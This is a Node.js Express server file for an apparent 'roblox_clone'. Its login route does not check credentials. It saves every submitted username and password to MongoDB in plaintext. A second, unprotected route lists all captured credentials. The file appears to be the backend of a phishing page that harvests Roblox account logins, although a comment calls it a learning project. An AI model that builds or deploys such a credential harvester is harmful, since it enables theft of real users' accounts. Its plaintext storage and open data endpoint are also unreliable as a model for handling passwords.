const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection
// For learning purposes, I'll use a local MongoDB string by default.
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/roblox_clone';

mongoose.connect(MONGODB_URI)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('Error connecting to MongoDB:', err));

// User Schema
const userSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    date: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Routes
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    try {
        const newUser = new User({ username, password });
        await newUser.save();
        console.log(`Saved user: ${username}`);
        res.status(201).json({ message: 'Login data saved successfully' });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Server error saving data' });
    }
});

app.get('/api/users', async (req, res) => {
    try {
        const users = await User.find().sort({ date: -1 });
        res.json(users);
    } catch (err) {
        res.status(500).json({ error: 'Server error fetching data' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
